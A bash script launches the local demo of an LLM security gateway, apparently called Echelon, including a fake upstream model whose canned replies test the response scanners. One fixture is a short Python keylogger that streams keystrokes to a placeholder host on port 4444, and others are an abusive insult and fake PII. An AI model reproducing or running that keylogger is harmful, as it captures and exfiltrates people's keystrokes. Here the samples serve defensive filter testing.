#!/usr/bin/env bash
# Boot the full Echelon stack locally (no Docker) for a live demo.
# Points the gateway at a fake upstream so no OpenAI key is required.
#
# In the monorepo the defaults resolve to ./pipeline ./gateway ./console.
#   PY                     - python interpreter with pipeline deps (torch/transformers/flask)
#   ECHELON_OLLAMA_MODEL   - local Ollama judge model (e.g. qwen2.5:14b); unset -> mock judge
#   CONSOLE_TOKEN          - operator credential for /v1/console/*; defaults to a local dev value.
#                            The gateway refuses to start without it, because those routes mint
#                            API keys and edit the security cascade's own thresholds.
#   GEMINI_API_KEY         - free Gemini API key (https://aistudio.google.com/apikey). When set,
#                            the Policy Desk demo UI (policy_assistant/, :8100) routes real
#                            gemini-* requests through the gateway's safety cascade to the real
#                            Gemini API. Unset -> Policy Desk still starts, in local extractive
#                            mode (no LLM call at all -- see policy_assistant/README.md).
#   POLICY_ASSISTANT_PY    - python interpreter for policy_assistant (needs Flask + pypdf,
#                            requirements.txt, no torch); defaults to $PY.
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
PIPELINE_DIR="${PIPELINE_DIR:-$HERE/pipeline}"
GATEWAY_DIR="${GATEWAY_DIR:-$HERE/gateway}"
CONSOLE_DIR="${CONSOLE_DIR:-$HERE/console}"
PY="${PY:-python3}"
OLLAMA_MODEL="${ECHELON_OLLAMA_MODEL:-}"
CONSOLE_TOKEN="${CONSOLE_TOKEN:-local-dev-operator-token}"

POLICY_DIR="${POLICY_DIR:-$HERE/policy_assistant}"
POLICY_PY="${POLICY_ASSISTANT_PY:-$PY}"
GEMINI_API_KEY="${GEMINI_API_KEY:-}"

pids=()
cleanup() { kill "${pids[@]}" 2>/dev/null || true; }
trap cleanup EXIT

echo "[1/4] fake upstream LLM on :9100 (scenario-aware, so egress can be demoed)"
"$PY" - <<'PYEOF' &
"""Stand-in upstream LLM.

Returns a safe answer by default. A few prompts elicit responses that exercise the
*egress* path -- toxic text, PII, and operational code -- because the response side
of the firewall cannot be demonstrated by a stub that only ever says "A safe answer".
Nothing here is a real model; it is a fixture that makes the response scanners run
against the shapes they were built for.
"""
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

SAFE = "A safe answer."
TOXIC = ("Honestly, that customer is a worthless idiot and everyone on the team "
         "thinks they should be humiliated publicly until they quit.")
PII = ("Here is the record you asked for: Jane Roe, jane.roe@example.com, "
       "SSN 123-45-6789, card 4111 1111 1111 1111.")
CODE = ("Sure, here is a keylogger:\n\n```python\n"
        "import socket\nfrom pynput import keyboard\n\n"
        "s = socket.socket()\ns.connect((\"[TARGET_HOST]\", 4444))\n\n"
        "def on_press(key):\n    s.send(str(key).encode())\n\n"
        "with keyboard.Listener(on_press=on_press) as listener:\n"
        "    listener.join()\n```")
DEFENSIVE = ("To *detect* a keylogger, watch for processes opening raw input devices "
             "and holding an outbound socket. A YARA rule matching pynput imports "
             "alongside socket.connect is a reasonable starting signature.")

def reply_for(prompt: str) -> str:
    p = prompt.lower()
    if "angry" in p or "insult" in p:
        return TOXIC
    if "customer record" in p or "account details" in p:
        return PII
    if "keylogger" in p and "detect" not in p:
        return CODE
    if "keylogger" in p:
        return DEFENSIVE
    return SAFE

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        raw = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        prompt = ""
        try:
            for m in json.loads(raw or b"{}").get("messages", []):
                if m.get("role") == "user":
                    prompt = m.get("content") or ""
        except Exception:
            pass
        body = json.dumps({
            "id": "cmpl",
            "choices": [{"message": {"role": "assistant", "content": reply_for(prompt)}}],
            "usage": {"prompt_tokens": 12, "completion_tokens": 8},
        }).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        body = b'{"data":[{"id":"gpt-4o-mini"}]}'
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass

HTTPServer(('127.0.0.1', 9100), H).serve_forever()
PYEOF
pids+=($!)

echo "[2/4] security service on :8099 (loads the model; judge=${OLLAMA_MODEL:-mock})"
( cd "$PIPELINE_DIR" && ECHELON_MODEL_DIR=models/layer2-threat-distilbert/best \
    ECHELON_OLLAMA_MODEL="$OLLAMA_MODEL" PORT=8099 "$PY" -m service.security_api ) &
pids+=($!)

echo "[3/4] building + starting gateway on :8080"
( cd "$GATEWAY_DIR" && go build -o /tmp/echelon-gateway ./cmd/server )
ML_BASE_URL=http://127.0.0.1:8099/classify JUDGE_BASE_URL=http://127.0.0.1:8099/judge \
EGRESS_ML_BASE_URL=http://127.0.0.1:8099/classify_response EGRESS_JUDGE_BASE_URL=http://127.0.0.1:8099/judge_response \
UPSTREAM_BASE_URL=http://127.0.0.1:9100 ECHELON_API_KEYS=sk-demo:acme:key_live:pro \
CONSOLE_TOKEN="$CONSOLE_TOKEN" \
PROVIDER_GEMINI_BASE_URL=https://generativelanguage.googleapis.com \
PROVIDER_GEMINI_API_KEY="$GEMINI_API_KEY" \
MODEL_ROUTES="gemini-*:gemini" DEFAULT_PROVIDER=openai \
HTTP_ADDR=:8080 SECURITY_FAIL_CLOSED=true \
RATE_LIMIT_REQUESTS="${RATE_LIMIT_REQUESTS:-10}" RATE_LIMIT_BURST="${RATE_LIMIT_BURST:-10}" \
ML_TIMEOUT=2s JUDGE_TIMEOUT=15s EGRESS_TIMEOUT=16s UPSTREAM_TIMEOUT=45s \
REQUEST_TIMEOUT=90s HTTP_WRITE_TIMEOUT=100s \
/tmp/echelon-gateway &
pids+=($!)

echo "[4/4] starting console on :3000"
( cd "$CONSOLE_DIR" && NEXT_PUBLIC_ECHELON_API_URL=http://localhost:8080 \
    NEXT_PUBLIC_ECHELON_CONSOLE_TOKEN="$CONSOLE_TOKEN" npm run dev ) &
pids+=($!)

if [ -d "$POLICY_DIR" ]; then
  echo "[5/5] starting Policy Desk demo UI on :8100"
  if [ -n "$GEMINI_API_KEY" ]; then
    echo "       -> real LLM mode: gemini-3.6-flash through the gateway's safety cascade"
    POLICY_LLM_KEY=sk-demo POLICY_LLM_BASE=http://localhost:8080/v1 POLICY_LLM_MODEL=gemini-3.6-flash
  else
    echo "       -> GEMINI_API_KEY not set: local extractive mode, no LLM call (see policy_assistant/README.md)"
    POLICY_LLM_KEY="" POLICY_LLM_BASE="" POLICY_LLM_MODEL=""
  fi
  ( cd "$HERE" && \
    LLM_BASE_URL="$POLICY_LLM_BASE" LLM_API_KEY="$POLICY_LLM_KEY" LLM_MODEL="$POLICY_LLM_MODEL" \
    POLICY_DATA_DIR="$POLICY_DIR/runtime" PORT=8100 \
    "$POLICY_PY" -m policy_assistant.app ) &
  pids+=($!)
fi

echo "waiting for services..."
for _ in $(seq 1 60); do
  curl -sf localhost:8099/health >/dev/null 2>&1 && curl -sf localhost:8080/healthz >/dev/null 2>&1 && break
  sleep 1
done
echo
echo "Echelon is up:"
echo "  console      : http://localhost:3000  (ops dashboard)"
echo "  gateway      : http://localhost:8080  (OpenAI-compatible, Bearer sk-demo)"
echo "  console API is operator-only: Bearer $CONSOLE_TOKEN"
if [ -d "$POLICY_DIR" ]; then
  echo "  policy desk  : http://localhost:8100  (end-user chat UI -> gateway -> Gemini)"
  if [ -z "$GEMINI_API_KEY" ]; then
    echo "                 GEMINI_API_KEY not set -> local extractive mode, no real LLM call."
    echo "                 Get a free key: https://aistudio.google.com/apikey, then rerun with"
    echo "                 GEMINI_API_KEY=... ./scripts/run-local.sh"
  fi
fi
echo "  drive demo traffic: scripts/demo-drive.sh"
echo "Ctrl-C to stop."
wait
